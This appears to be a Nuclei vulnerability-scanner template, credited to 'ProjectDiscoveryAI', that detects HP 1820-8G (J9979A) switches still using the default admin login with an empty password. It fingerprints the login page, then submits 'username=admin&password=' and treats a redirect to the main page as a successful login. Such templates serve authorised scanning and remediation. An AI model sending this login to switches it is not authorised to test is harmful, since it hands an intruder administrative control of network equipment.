id: hp-1820-8g-switch-weak-password

info:
  name: HP 1820-8G Switch J9979A Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password

http:
  - raw:
      - |
        GET /htdocs/login/login.lsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "HP 1820-8G Switch J9979A"

  - raw:
      - |
        POST /htdocs/login/login.lua HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "\"redirect\"\\x3a \"/htdocs/pages/main/main.lsp\""
          - "\"error\"\\x3a \"\""
